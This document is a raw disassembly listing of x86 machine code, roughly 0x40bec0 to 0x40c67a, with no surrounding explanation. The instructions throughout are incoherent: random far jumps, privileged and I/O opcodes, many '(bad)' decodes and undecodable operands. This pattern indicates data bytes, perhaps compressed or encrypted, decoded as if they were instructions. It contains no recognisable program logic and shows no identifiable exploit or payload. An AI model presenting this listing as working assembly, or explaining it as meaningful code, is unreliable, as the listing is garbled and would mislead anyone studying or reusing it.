  40bec0:	add    BYTE PTR [edi],bh
  40bec2:	add    al,0x76
  40bec4:	test   eax,0x16226761
  40bec9:	hlt    
  40beca:	jmp    0x3f6:0xa295a530
  40bed1:	popa   
  40bed2:	xchg   DWORD PTR [eax],edx
  40bed4:	push   esp
  40bed5:	jns    0x40bf3a
  40bed7:	xor    esi,eax
  40bed9:	call   DWORD PTR [esi+0x6aba8d54]
  40bedf:	jecxz  0x40beaf
  40bee1:	aaa    
  40bee2:	sub    al,0xeb
  40bee4:	mov    eax,0xf692331c
  40bee9:	inc    ebx
  40beea:	int3   
  40beeb:	es mov edx,0x23cf9d0c
  40bef1:	das    
  40bef2:	popf   
  40bef3:	mov    eax,0x78160ea1
  40bef8:	mov    al,0x61
  40befa:	sysexit 
  40befc:	jns    0x40bef0
  40befe:	and    dl,BYTE PTR [eax]
  40bf00:	aad    0xd6
  40bf02:	xchg   DWORD PTR [eax],ebx
  40bf04:	lods   eax,DWORD PTR ds:[esi]
  40bf05:	lahf   
  40bf06:	push   cs
  40bf07:	aad    0xe7
  40bf09:	aas    
  40bf0a:	mov    bl,bl
  40bf0c:	mov    ch,0xac
  40bf0e:	dec    eax
  40bf0f:	xor    al,0x7c
  40bf11:	and    DWORD PTR [ecx],0xffffffdc
  40bf14:	mov    ebp,esi
  40bf16:	jmp    0x332d:0x9a6a7046
  40bf1d:	or     BYTE PTR [edi],ah
  40bf1f:	in     eax,dx
  40bf20:	loop   0x40bf98
  40bf22:	xor    esi,edi
  40bf24:	cmp    eax,0xde60bc70
  40bf29:	xchg   edi,eax
  40bf2a:	dec    edx
  40bf2b:	mov    esp,0xaa701ae3
  40bf30:	retf   0x76a9
  40bf33:	ja     0x40bed9
  40bf35:	je     0x40beec
  40bf37:	adc    BYTE PTR [esi-0x25],ah
  40bf3a:	or     BYTE PTR [esi-0x63],0x7a
  40bf3e:	ins    DWORD PTR es:[edi],dx
  40bf3f:	mov    ds:0x75acf4e8,al
  40bf44:	fiadd  WORD PTR [ebp-0x66ef5585]
  40bf4a:	mov    ch,0x4f
  40bf4c:	lds    eax,FWORD PTR [edi-0x1439c88e]
  40bf52:	les    ecx,FWORD PTR [esi+0x439dd026]
  40bf58:	scas   al,BYTE PTR es:[edi]
  40bf59:	shl    BYTE PTR [eax+0x4218c219],0x96
  40bf60:	(bad)  
  40bf62:	les    ecx,FWORD PTR [edx]
  40bf64:	(bad)  
  40bf65:	sub    BYTE PTR [edi+0x26399e09],al
  40bf6b:	leave  
  40bf6c:	inc    ebx
  40bf6d:	jo     0x40bf77
  40bf6f:	pop    esi
  40bf70:	out    dx,al
  40bf71:	in     eax,dx
  40bf72:	(bad)  
  40bf73:	mov    DWORD PTR [edi-0x709d5b2b],0x41cda994
  40bf7d:	or     edi,DWORD PTR [edx+0x6]
  40bf80:	mov    ah,0xe3
  40bf82:	jnp    0x40bf85
  40bf84:	rcl    BYTE PTR [ecx-0x4a],0x5f
  40bf88:	xchg   ecx,eax
  40bf89:	inc    ebx
  40bf8a:	(bad)  
  40bf8b:	jmp    0x3443:0x1345b14a
  40bf92:	stc    
  40bf93:	(bad)  
  40bf94:	mov    ds:0xba98c441,eax
  40bf99:	ja     0x40bf88
  40bf9b:	mov    BYTE PTR [bp+di+0x53],dh
  40bf9f:	ins    BYTE PTR es:[edi],dx
  40bfa0:	fldenv [eax-0x16]
  40bfa3:	cli    
  40bfa4:	xchg   ebp,ebx
  40bfa6:	popf   
  40bfa7:	mov    edx,0x9b387f2d
  40bfac:	sbb    al,0xfe
  40bfae:	sub    ebp,DWORD PTR [edx+0x3a]
  40bfb1:	mov    edx,0x1a285680
  40bfb6:	pop    esi
  40bfb7:	sbb    esi,DWORD PTR [edx-0x598cd7a3]
  40bfbd:	mov    cl,0x13
  40bfbf:	mov    cl,0x14
  40bfc1:	xchg   edi,eax
  40bfc2:	cmp    esi,esi
  40bfc4:	xor    DWORD PTR [edx+0x285f24d1],esp
  40bfca:	or     al,0xc2
  40bfcc:	sti    
  40bfcd:	enter  0x70d4,0xef
  40bfd1:	or     DWORD PTR [ecx],esp
  40bfd3:	std    
  40bfd4:	iret   
  40bfd5:	hlt    
  40bfd6:	dec    eax
  40bfd7:	push   0x98ecf508
  40bfdc:	push   ebp
  40bfdd:	int    0x74
  40bfdf:	(bad)  
  40bfe1:	(bad)  
  40bfe2:	push   ecx
  40bfe3:	les    esi,FWORD PTR ds:0xf088
  40bfe8:	cmp    ebp,DWORD PTR [ecx+0x40]
  40bfeb:	lock sub DWORD PTR [esi+eax*4],ebp
  40bfef:	inc    ecx
  40bff0:	jnp    0x40bfff
  40bff2:	loopne 0x40bfc6
  40bff4:	ficom  DWORD PTR [eax+esi*2-0x78f91256]
  40bffb:	dec    edi
  40bffc:	pushf  
  40bffd:	mov    al,BYTE PTR [ebp+0x2a]
  40c000:	in     al,0x9
  40c002:	mov    al,cs:0x666fd4a4
  40c008:	(bad)  
  40c00a:	cld    
  40c00b:	or     dh,al
  40c00d:	xor    eax,0x36a36ab
  40c012:	mov    eax,0x96e2c900
  40c017:	std    
  40c018:	mov    eax,ds:0xc2a2a3dc
  40c01d:	outs   dx,BYTE PTR ds:[esi]
  40c01e:	xor    BYTE PTR [ecx+0x55],bl
  40c021:	jno    0x40bfc1
  40c023:	(bad)  
  40c024:	shl    BYTE PTR ds:0xdd00bf0,0x5b
  40c02b:	sub    edx,DWORD PTR [ebx]
  40c02d:	outs   dx,BYTE PTR ds:[esi]
  40c02e:	adc    ecx,esi
  40c030:	lods   eax,DWORD PTR ds:[esi]
  40c031:	xchg   esi,eax
  40c032:	loopne 0x40c01e
  40c034:	and    esi,ebx
  40c036:	xchg   BYTE PTR [edi+esi*2-0x49a01d74],ah
  40c03d:	sbb    eax,0xcf4d87
  40c042:	add    ch,ch
  40c044:	ja     0x40c0b9
  40c046:	jae    0x40c094
  40c048:	dec    esp
  40c049:	sti    
  40c04a:	imul   ebx,edi,0x15
  40c04d:	jmp    0xbfca:0xe6e60b97
  40c054:	add    DWORD PTR [eax-0x7e94326f],ebx
  40c05a:	xchg   DWORD PTR [ebx-0x95da9f1],ecx
  40c060:	add    eax,0x3df2d698
  40c065:	sar    BYTE PTR [esi],cl
  40c067:	aam    0x27
  40c069:	cmp    ecx,eax
  40c06b:	sbb    DWORD PTR [ebp+0x16b3070a],0x4b93d3be
  40c075:	fisubr DWORD PTR [edi+ebx*4+0x41]
  40c079:	dec    esi
  40c07a:	adc    BYTE PTR [ebx+0x3cea33ee],dl
  40c080:	jmp    0x40c031
  40c082:	call   0x7473213e
  40c087:	xor    ebp,DWORD PTR ds:0xbacfe05c
  40c08d:	addr16 leave 
  40c08f:	(bad)  
  40c090:	mov    esi,0xe91ac732
  40c095:	cwde   
  40c096:	jno    0x40c054
  40c098:	pop    ds
  40c099:	pop    eax
  40c09a:	push   esp
  40c09b:	mov    ah,0xad
  40c09d:	xchg   DWORD PTR [edx],edx
  40c09f:	push   ecx
  40c0a0:	fstp   TBYTE PTR [si+0x1d]
  40c0a4:	out    0xee,al
  40c0a6:	aam    0x65
  40c0a8:	test   ebp,ebp
  40c0aa:	and    DWORD PTR [ecx+eax*1+0x4],ebp
  40c0ae:	lods   al,BYTE PTR ds:[esi]
  40c0b0:	scas   eax,DWORD PTR es:[edi]
  40c0b1:	jne    0x40c05a
  40c0b3:	call   0x32df:0xd92e5861
  40c0ba:	xchg   esp,eax
  40c0bb:	inc    eax
  40c0bc:	xchg   esp,eax
  40c0bd:	std    
  40c0be:	clc    
  40c0bf:	and    DWORD PTR ds:0x6298b37a,esp
  40c0c5:	sbb    cl,bl
  40c0c7:	cmc    
  40c0c8:	pop    esp
  40c0c9:	test   DWORD PTR [ecx-0x78],esp
  40c0cc:	or     bl,BYTE PTR [eax-0x5d58350b]
  40c0d2:	sbb    al,0xd7
  40c0d4:	imul   ecx,DWORD PTR [edx],0x58e746aa
  40c0da:	jbe    0x40c095
  40c0dc:	rol    BYTE PTR [esi],1
  40c0de:	inc    ebx
  40c0df:	add    eax,0xb98bb2a2
  40c0e4:	into   
  40c0e5:	jmp    0xe1a19b33
  40c0ea:	test   DWORD PTR [edx],eax
  40c0ec:	clc    
  40c0ed:	fnsave [edx+0x1]
  40c0f0:	cs inc ebp
  40c0f2:	(bad)  
  40c0f3:	mov    esi,0xee803290
  40c0f8:	popf   
  40c0f9:	fmul   DWORD PTR [edi+0x4a]
  40c0fc:	loop   0x40c0f1
  40c0fe:	mov    bh,0x9a
  40c100:	imul   ebp,eax,0x896f716a
  40c106:	(bad)  
  40c108:	aas    
  40c109:	or     BYTE PTR [eax+0x77ac04e1],cl
  40c10f:	aas    
  40c110:	fldenv ds:0x6f1aa3ad
  40c116:	in     eax,dx
  40c117:	(bad)  
  40c118:	cli    
  40c119:	mov    ah,0x99
  40c11b:	jno    0x40c13a
  40c11d:	jmp    0x40c0ac
  40c11f:	add    eax,0xcf8566d7
  40c124:	jecxz  0x40c0b1
  40c126:	sub    eax,0x222a3900
  40c12b:	jns    0x40c14b
  40c12d:	aaa    
  40c12e:	fisttp WORD PTR [ebx+ebx*4]
  40c131:	add    BYTE PTR [ecx],0xa2
  40c134:	sbb    al,0xb5
  40c136:	cmp    cl,cl
  40c138:	xor    BYTE PTR [esp-0x49],bh
  40c13c:	dec    esi
  40c13d:	dec    edx
  40c13e:	cwde   
  40c13f:	jno    0x40c161
  40c141:	dec    esi
  40c142:	push   ds
  40c143:	in     al,0xf8
  40c145:	dec    edi
  40c146:	ret    
  40c147:	loopne 0x40c124
  40c149:	ret    0x5ee7
  40c14c:	mov    ebx,cs
  40c14e:	xchg   esi,eax
  40c14f:	mov    ebx,0xf1a61352
  40c154:	sub    eax,0x11ce6b8e
  40c159:	or     bl,BYTE PTR [ebp+0x445aa6b9]
  40c15f:	cdq    
  40c160:	lock hlt 
  40c162:	and    DWORD PTR [ebp+0x45],ebp
  40c165:	sub    cl,BYTE PTR [ebp-0x5af21fda]
  40c16b:	xchg   esi,eax
  40c16c:	ror    DWORD PTR [esi-0x8],0x22
  40c170:	jne    0x40c1d3
  40c172:	xchg   esi,eax
  40c173:	pop    edx
  40c174:	pop    eax
  40c175:	mov    al,ds:0xf3f6ad04
  40c17a:	cmc    
  40c17b:	inc    edi
  40c17c:	aad    0x48
  40c17e:	lea    esp,[ecx-0xa]
  40c181:	out    dx,eax
  40c182:	xchg   edi,eax
  40c183:	xor    edi,DWORD PTR [ebp-0x23]
  40c186:	fldenv [esi+0x7c]
  40c189:	shl    ecx,cl
  40c18b:	xor    BYTE PTR [ebp-0xe],0x84
  40c18f:	outs   dx,DWORD PTR ds:[esi]
  40c190:	dec    ebp
  40c191:	ins    DWORD PTR es:[edi],dx
  40c192:	and    DWORD PTR [ebp-0x31],ebp
  40c195:	rol    DWORD PTR [edi],cl
  40c197:	add    eax,0xd5bbcbde
  40c19c:	dec    esi
  40c19d:	(bad)  
  40c19e:	cld    
  40c19f:	fbstp  TBYTE PTR [esi+0x6f]
  40c1a2:	jl     0x40c13d
  40c1a4:	iret   
  40c1a5:	ins    DWORD PTR es:[edi],dx
  40c1a6:	test   DWORD PTR [ebp-0x5273ad2e],edi
  40c1ac:	inc    ebp
  40c1ad:	mov    dl,cl
  40c1af:	dec    ecx
  40c1b0:	(bad)  
  40c1b1:	cmp    ch,al
  40c1b3:	or     eax,0xb7157e84
  40c1b8:	push   edi
  40c1b9:	xor    edx,esp
  40c1bb:	xor    ebp,DWORD PTR [esi]
  40c1bd:	cwde   
  40c1be:	adc    al,BYTE PTR [edx+0xa39131a]
  40c1c4:	sub    eax,0x826019fa
  40c1c9:	push   esi
  40c1ca:	sub    ah,BYTE PTR [edi+0x1ace0440]
  40c1d0:	xor    eax,DWORD PTR [eax-0x1026f1b]
  40c1d6:	pop    ecx
  40c1d7:	pusha  
  40c1d8:	retf   0xdf64
  40c1db:	push   edi
  40c1dc:	cmp    eax,0x5e24b09a
  40c1e1:	mov    ebx,0x122fb55a
  40c1e6:	jnp    0x40c1f9
  40c1e8:	dec    eax
  40c1e9:	mov    edi,DWORD PTR ds:0xebb96908
  40c1ef:	adc    DWORD PTR [edx-0x1e6e84a4],esi
  40c1f5:	icebp  
  40c1f6:	(bad)  
  40c1f7:	jae    0x40c1b4
  40c1f9:	addr16 dec eax
  40c1fb:	mov    ah,0x19
  40c1fd:	sbb    dl,bl
  40c1ff:	stc    
  40c200:	in     al,0x17
  40c202:	jg     0x40c27f
  40c204:	xchg   ebp,eax
  40c205:	xor    al,0xa3
  40c207:	xchg   ebp,eax
  40c208:	jo     0x40c1fb
  40c20a:	jo     0x40c1cc
  40c20c:	sub    eax,0x6872be8c
  40c211:	mov    ds:0x23458f4,eax
  40c216:	mov    esp,0x19ff3471
  40c21b:	jnp    0x40c1d0
  40c21d:	jb     0x40c280
  40c21f:	xchg   esi,eax
  40c220:	fnstcw WORD PTR [ebx+edi*2]
  40c223:	pop    ebx
  40c224:	popf   
  40c225:	ja     0x40c1d2
  40c227:	sbb    eax,0xb16a3986
  40c22c:	jp     0x40c23e
  40c22e:	mov    ?,WORD PTR [eax+0x50beef5c]
  40c234:	add    eax,0xe13d2b34
  40c239:	sub    eax,0x2c69d42f
  40c23e:	lahf   
  40c23f:	pop    ds
  40c240:	jle    0x40c22f
  40c242:	add    BYTE PTR [ecx-0x1d29e037],ch
  40c248:	add    al,0xdd
  40c24a:	(bad)  
  40c24b:	loopne 0x40c2a1
  40c24d:	ret    0x51cd
  40c250:	out    0xf,al
  40c252:	jb     0x40c244
  40c254:	mov    ebx,0x2e01b94f
  40c259:	sbb    DWORD PTR [edi+0x566afcc0],edi
  40c25f:	jl     0x40c2be
  40c261:	mov    esp,0x333724a8
  40c266:	push   cs
  40c267:	iret   
  40c268:	sub    DWORD PTR [edi+0x36c2b624],0xcf269b8c
  40c272:	mov    ds:0x45468823,eax
  40c277:	jno    0x40c245
  40c279:	push   ds
  40c27a:	clc    
  40c27b:	xchg   ecx,eax
  40c27c:	aas    
  40c27d:	and    eax,0x1d681f64
  40c282:	in     eax,dx
  40c283:	adc    eax,0x3b412816
  40c288:	jmp    0x40c251
  40c28a:	add    al,0x44
  40c28c:	sub    ebx,esp
  40c28e:	fisttp DWORD PTR [esi]
  40c290:	fild   WORD PTR [ebx+0x70faa7af]
  40c296:	js     0x40c24b
  40c298:	sub    BYTE PTR [edx+0x332781ea],al
  40c29e:	sbb    ecx,DWORD PTR [esp+esi*8-0x3e]
  40c2a2:	and    BYTE PTR [ecx-0x2aaf82d2],0x3f
  40c2a9:	test   ah,ah
  40c2ab:	pop    ds
  40c2ac:	stos   DWORD PTR es:[edi],eax
  40c2ad:	dec    ebp
  40c2ae:	xchg   ecx,eax
  40c2af:	int    0x1b
  40c2b1:	out    0x88,al
  40c2b3:	out    dx,al
  40c2b4:	sbb    DWORD PTR [eax-0x23e9ac94],ebp
  40c2ba:	jns    0x40c2a0
  40c2bc:	repz xor BYTE PTR [esi-0x21],ch
  40c2c0:	push   eax
  40c2c1:	adc    BYTE PTR [ecx+edx*2-0x7f],cl
  40c2c5:	mov    ah,0xc0
  40c2c7:	push   cs
  40c2c8:	jle    0x40c30d
  40c2ca:	stos   BYTE PTR es:[edi],al
  40c2cb:	(bad)  
  40c2cc:	fist   DWORD PTR [ecx]
  40c2ce:	mov    ds:0x1684c6e8,al
  40c2d3:	outs   dx,DWORD PTR ds:[esi]
  40c2d4:	sub    edi,DWORD PTR [edi]
  40c2d6:	sbb    BYTE PTR [esi+ecx*2-0x5f],ch
  40c2da:	lock mov edi,0xae2dc478
  40c2e0:	add    BYTE PTR [eax],bh
  40c2e2:	lock xor DWORD PTR [ebp-0x35],0xffffffe0
  40c2e7:	aas    
  40c2e8:	adc    DWORD PTR [esi],0xcfcaf677
  40c2ee:	mov    eax,ds:0x69fd1f46
  40c2f3:	fucomip st,st(4)
  40c2f5:	sahf   
  40c2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f7:	cdq    
  40c2f8:	xor    eax,0x7aefe7b0
  40c2fd:	push   0x51
  40c2ff:	mov    ds:0x2de78e75,al
  40c304:	inc    edx
  40c305:	pop    es
  40c306:	pop    es
  40c307:	daa    
  40c308:	imul   ecx,DWORD PTR [ebx-0x1c1786fe],0x82f0e49a
  40c312:	cs mov dl,0x14
  40c315:	sub    DWORD PTR [ebx],ebp
  40c317:	and    BYTE PTR [esi-0x18],ch
  40c31a:	loopne 0x40c383
  40c31c:	pop    edx
  40c31d:	fisubr DWORD PTR es:[ebx+0xf]
  40c321:	das    
  40c322:	test   ah,cl
  40c324:	mov    ds:0xd3d4eec2,al
  40c329:	push   ebx
  40c32a:	mov    ebx,0x53fe743d
  40c32f:	cld    
  40c330:	je     0x40c2c9
  40c332:	hlt    
  40c333:	xchg   edx,eax
  40c334:	gs iret 
  40c336:	les    eax,FWORD PTR [ecx-0x14594468]
  40c33c:	xor    DWORD PTR [esi],0xde9970ae
  40c342:	jne    0x40c2e7
  40c344:	ror    BYTE PTR ds:0x1982e2d1,cl
  40c34a:	push   es
  40c34b:	xor    eax,0x59a5b1be
  40c350:	xchg   ebx,eax
  40c351:	lock mov bh,0xe6
  40c354:	push   ecx
  40c355:	fimul  DWORD PTR [esi+0x95e4b8e]
  40c35b:	push   es
  40c35c:	or     eax,0x19829f91
  40c361:	jb     0x40c3c6
  40c363:	jg     0x40c36c
  40c365:	test   al,0xf7
  40c367:	div    DWORD PTR [eax]
  40c369:	ror    eax,cl
  40c36b:	inc    esi
  40c36c:	pop    edi
  40c36d:	cdq    
  40c36e:	in     al,0xfe
  40c370:	stos   BYTE PTR es:[edi],al
  40c371:	xchg   esp,eax
  40c372:	fild   QWORD PTR [ebx+ecx*2-0x3495f3a8]
  40c379:	sub    al,0xb6
  40c37b:	rcl    WORD PTR [eax-0x58],cl
  40c37f:	pop    ebp
  40c380:	mov    eax,0x89df89f2
  40c385:	stos   DWORD PTR es:[edi],eax
  40c386:	push   eax
  40c387:	jmp    0x40c3c5
  40c389:	aaa    
  40c38a:	mov    ds:0xb1dff8d8,al
  40c38f:	(bad)
  40c393:	hlt    
  40c394:	je     0x40c40d
  40c396:	mov    esp,0xcd89e309
  40c39b:	fstp   DWORD PTR [ecx-0x3c632a77]
  40c3a1:	cs pop edi
  40c3a3:	xchg   ebp,eax
  40c3a4:	dec    ebp
  40c3a5:	push   ds
  40c3a6:	mov    ebx,0x9ad28464
  40c3ab:	pop    ss
  40c3ac:	int    0xbd
  40c3ae:	xchg   ebp,eax
  40c3af:	xchg   bp,ax
  40c3b1:	sbb    ch,bl
  40c3b3:	add    cl,bh
  40c3b5:	jnp    0x40c3e5
  40c3b7:	xor    edx,DWORD PTR [ecx-0x15a7e277]
  40c3bd:	add    ecx,DWORD PTR [eax]
  40c3bf:	clc    
  40c3c0:	mov    ebx,0xc92c8ebf
  40c3c5:	fld    QWORD PTR [ebx]
  40c3c7:	xlat   BYTE PTR ds:[ebx]
  40c3c8:	sub    DWORD PTR [ebx-0x75],0x5a
  40c3cc:	fmul   st,st(5)
  40c3ce:	lods   al,BYTE PTR ds:[esi]
  40c3cf:	push   0x1f44692c
  40c3d4:	imul   esp,esi,0x918286d4
  40c3da:	sti    
  40c3db:	outs   dx,BYTE PTR ds:[esi]
  40c3dc:	jmp    0x6021:0xb351146a
  40c3e3:	aam    0x87
  40c3e5:	mov    ebx,0x307e274d
  40c3ea:	adc    eax,0x7d4d60ec
  40c3ef:	or     eax,0x6d7e3509
  40c3f4:	(bad)  
  40c3f5:	in     al,dx
  40c3f6:	add    eax,0x2fe83004
  40c3fb:	dec    edx
  40c3fc:	icebp  
  40c3fd:	xchg   ecx,eax
  40c3fe:	push   eax
  40c3ff:	mov    esp,0x363d1361
  40c404:	jle    0x40c3b9
  40c406:	or     ah,dh
  40c408:	adc    eax,0xcb7e6452
  40c40d:	(bad)  
  40c40e:	loopne 0x40c407
  40c410:	cmp    eax,0xbb6c67f9
  40c415:	dec    ebx
  40c416:	xchg   ebx,eax
  40c417:	sar    DWORD PTR [edi-0x28b1428d],0xe9
  40c41e:	mov    cl,0xac
  40c420:	fimul  DWORD PTR [edx]
  40c422:	dec    edi
  40c423:	add    al,0x49
  40c425:	adc    eax,0x56b21e37
  40c42a:	mov    DWORD PTR [edi-0x31],edx
  40c42d:	fwait
  40c42e:	in     al,0x75
  40c430:	aas    
  40c431:	xchg   esp,eax
  40c432:	mov    esi,?
  40c434:	fild   WORD PTR [ebp+0x29]
  40c437:	push   ebx
  40c438:	or     esp,edx
  40c43a:	dec    esp
  40c43b:	ins    DWORD PTR es:[edi],dx
  40c43c:	and    al,0x77
  40c43e:	xchg   edi,eax
  40c43f:	add    DWORD PTR [edx+0x24eea3a5],0xffffffd8
  40c446:	out    dx,eax
  40c447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c448:	in     al,0xf2
  40c44a:	int    0x8
  40c44c:	ret    
  40c44d:	dec    eax
  40c44e:	push   edx
  40c44f:	cmp    eax,0x7034709c
  40c454:	in     eax,dx
  40c455:	push   edi
  40c456:	jno    0x40c4d2
  40c458:	pop    ss
  40c459:	in     al,dx
  40c45a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c45b:	lods   al,BYTE PTR ss:[esi]
  40c45d:	pop    ebx
  40c45e:	fs (bad) 
  40c460:	cdq    
  40c461:	das    
  40c462:	xor    DWORD PTR [eax+eax*1-0x4bc8e9ca],ebp
  40c469:	stos   DWORD PTR es:[edi],eax
  40c46a:	sahf   
  40c46b:	stos   BYTE PTR es:[edi],al
  40c46c:	out    dx,eax
  40c46d:	test   ah,ch
  40c46f:	icebp  
  40c470:	sub    eax,ebp
  40c472:	push   cs
  40c473:	mov    DWORD PTR ds:[ebp-0x43ac4c64],esp
  40c47a:	mov    ebp,0x584ede8
  40c47f:	push   ss
  40c480:	ds es lock stc 
  40c484:	mov    eax,ds:0x6ea6dcd3
  40c489:	pushf  
  40c48a:	pop    ss
  40c48b:	cmp    eax,0xab3e606
  40c490:	jmp    FWORD PTR [ecx]
  40c492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c493:	xchg   esp,eax
  40c494:	aad    0x37
  40c496:	sbb    al,0x60
  40c498:	shl    BYTE PTR ds:0xdfe5758,1
  40c49e:	fcomip st,st(5)
  40c4a0:	sub    BYTE PTR [ebp+0x25131161],cl
  40c4a6:	test   DWORD PTR [ebx],ebp
  40c4a8:	outs   dx,BYTE PTR ds:[esi]
  40c4a9:	clc    
  40c4aa:	fucomp st(4)
  40c4ac:	fadd   QWORD PTR [ecx+esi*8]
  40c4af:	(bad)  
  40c4b1:	mov    al,0x95
  40c4b3:	pop    edi
  40c4b4:	sbb    esp,DWORD PTR [esi]
  40c4b6:	and    BYTE PTR [esi+esi*8],bl
  40c4b9:	icebp  
  40c4ba:	and    eax,0xa66cd941
  40c4bf:	fistp  QWORD PTR [ecx]
  40c4c1:	lahf   
  40c4c2:	sub    BYTE PTR [esi],dl
  40c4c4:	sub    eax,0xe15ec542
  40c4c9:	mov    ah,0x34
  40c4cb:	push   esp
  40c4cc:	or     BYTE PTR [edx],al
  40c4ce:	cmc    
  40c4cf:	jge    0x40c4e4
  40c4d1:	stc    
  40c4d2:	test   eax,0x666edabd
  40c4d7:	in     al,dx
  40c4d8:	fidivr DWORD PTR [edi]
  40c4da:	dec    edi
  40c4db:	ins    DWORD PTR es:[edi],dx
  40c4dc:	ret    
  40c4dd:	shl    esi,1
  40c4df:	(bad)  
  40c4e0:	mov    edi,0xc7b29aee
  40c4e5:	mov    dl,0xbc
  40c4e7:	aaa    
  40c4e8:	daa    
  40c4e9:	dec    ecx
  40c4ea:	push   esi
  40c4eb:	nop
  40c4ec:	int3   
  40c4ed:	cmp    al,0x7e
  40c4ef:	cmc    
  40c4f0:	mov    WORD PTR [edx+0x1e0ae4eb],?
  40c4f6:	mul    BYTE PTR [ebx+0x51541ee6]
  40c4fc:	je     0x40c4b4
  40c4fe:	jp     0x40c4af
  40c500:	push   ds
  40c501:	leave  
  40c502:	jmp    0xfe07db01
  40c507:	pop    eax
  40c508:	add    al,0x90
  40c50a:	and    al,0x6
  40c50c:	out    dx,al
  40c50d:	push   ss
  40c50e:	adc    al,BYTE PTR [eax+0xf]
  40c511:	jl     0x40c51b
  40c513:	mov    bl,BYTE PTR [eax-0x48]
  40c516:	mov    eax,0xff878f1d
  40c51b:	push   ecx
  40c51d:	int    0xaf
  40c51f:	mov    bl,0xae
  40c521:	xor    ebp,DWORD PTR [edi-0x30b1f1a9]
  40c527:	xchg   esi,eax
  40c528:	out    dx,eax
  40c529:	pop    ds
  40c52a:	mov    edx,0x4e3be28d
  40c52f:	mov    ds:0xf766810e,eax
  40c534:	fwait
  40c535:	cmp    DWORD PTR [ebp+0x4a],esp
  40c538:	jg     0x40c550
  40c53a:	call   0x43b9b829
  40c53f:	out    0x79,al
  40c541:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c543:	popf   
  40c544:	lock jle 0x40c5a3
  40c547:	dec    ecx
  40c548:	test   DWORD PTR [ebp-0x26],edi
  40c54b:	(bad)
  40c54f:	jecxz  0x40c5a8
  40c551:	in     al,0x46
  40c553:	aad    0xf2
  40c555:	push   edi
  40c556:	lods   eax,DWORD PTR ds:[esi]
  40c557:	or     eax,DWORD PTR [ecx+0x1c]
  40c55a:	lock cdq 
  40c55c:	or     eax,0xa3fa0b9d
  40c561:	ret    0x849
  40c564:	cdq    
  40c565:	inc    edx
  40c566:	mov    ebx,0xb7a8900e
  40c56b:	rcr    BYTE PTR [edx+0x70],0x8
  40c56f:	dec    eax
  40c570:	jge    0x40c53b
  40c572:	rcr    BYTE PTR [edi+0x1b],0x47
  40c576:	jne    0x40c5b4
  40c578:	mov    bl,0xe6
  40c57a:	ds add al,0x47
  40c57d:	cmp    DWORD PTR [ecx+ebp*2-0x6d],esp
  40c581:	xor    al,0xe6
  40c583:	cmc    
  40c584:	sub    BYTE PTR [esi+edi*8-0xa23ed01],ch
  40c58b:	inc    ecx
  40c58c:	adc    eax,0x8d90effa
  40c591:	dec    esp
  40c592:	int    0x59
  40c594:	pushf  
  40c595:	sub    dl,BYTE PTR [esi]
  40c597:	stos   BYTE PTR es:[edi],al
  40c598:	stos   DWORD PTR es:[edi],eax
  40c599:	add    BYTE PTR gs:[eax+0x1bcaddc4],ah
  40c5a0:	jge    0x40c52e
  40c5a2:	sbb    esi,DWORD PTR [ebx+0xf346a68]
  40c5a8:	jmp    0x40c539
  40c5aa:	pop    ds
  40c5ab:	fwait
  40c5ac:	jbe    0x40c56c
  40c5ae:	cmp    DWORD PTR [ebx+0x67],0xde49803a
  40c5b5:	mov    esp,0x5a91134a
  40c5ba:	lock or eax,0x75d74b31
  40c5c0:	mov    WORD PTR [ebp+edx*1-0x55],gs
  40c5c4:	cmp    eax,0xdd4d67e7
  40c5c9:	fisttp QWORD PTR [esi]
  40c5cb:	mov    edi,0x429a67d4
  40c5d0:	mov    al,ds:0x4a4b997b
  40c5d5:	outs   dx,DWORD PTR ds:[esi]
  40c5d6:	gs inc ebp
  40c5d8:	lods   al,BYTE PTR ds:[esi]
  40c5d9:	das    
  40c5da:	cmp    eax,0xb81c3ba5
  40c5df:	and    DWORD PTR [edx+0x4f],0xffffffe5
  40c5e3:	and    esi,DWORD PTR [ebx]
  40c5e5:	(bad)  
  40c5e7:	xlat   BYTE PTR ds:[ebx]
  40c5e8:	mov    BYTE PTR [edi+ebp*1-0x2ab1c1e3],cl
  40c5ef:	mov    ?,WORD PTR [ebx+ebp*4-0x7]
  40c5f3:	(bad)  
  40c5f4:	das    
  40c5f5:	inc    eax
  40c5f6:	or     BYTE PTR [esi],dl
  40c5f8:	cdq    
  40c5f9:	xor    BYTE PTR ds:0x3a8eb084,ah
  40c5ff:	add    BYTE PTR [edx],dh
  40c601:	sub    ch,BYTE PTR [edi-0x2]
  40c604:	repnz (bad) 
  40c606:	test   al,0x36
  40c608:	and    al,0x84
  40c60a:	int    0x42
  40c60c:	out    0xea,eax
  40c60e:	(bad)  
  40c60f:	daa    
  40c610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c611:	mov    eax,0xf54f324b
  40c616:	addr16 hlt 
  40c618:	ds das 
  40c61a:	and    edi,DWORD PTR [eax+0x29304969]
  40c620:	js     0x40c614
  40c622:	or     bh,BYTE PTR ds:0x6ae911d2
  40c628:	mov    edx,0xdcb92463
  40c62d:	pop    ecx
  40c62e:	out    dx,al
  40c62f:	jle    0x40c5c6
  40c631:	imul   eax,DWORD PTR [edi-0x7f4ae137],0x6b
  40c638:	enter  0x8822,0xa4
  40c63c:	jb     0x40c5de
  40c63e:	or     DWORD PTR [eax],ebp
  40c640:	sub    BYTE PTR [edx+0x3c],dh
  40c643:	popw   ds
  40c645:	sti    
  40c646:	sbb    ch,BYTE PTR [ecx+0x46]
  40c649:	ins    BYTE PTR es:[edi],dx
  40c64a:	ret    
  40c64b:	or     BYTE PTR ds:0xa5fa321b,bh
  40c651:	into   
  40c652:	test   eax,0xf90b7c52
  40c657:	in     eax,0x20
  40c659:	fwait
  40c65a:	nop
  40c65b:	dec    ebp
  40c65c:	aad    0x31
  40c65e:	pop    edx
  40c65f:	mov    cs,WORD PTR [edx-0x7d69d063]
  40c665:	sbb    BYTE PTR [edx],cl
  40c667:	stos   DWORD PTR es:[edi],eax
  40c668:	js     0x40c607
  40c66a:	mov    DWORD PTR ds:0xb4405aff,edx
  40c670:	pop    ecx
  40c671:	jp     0x40c67e
  40c673:	adc    DWORD PTR [ebx-0x52],esp
  40c676:	jg     0x40c657
  40c678:	dec    eax
  40c679:	pop    edx
  40c67a:	int    0xfd
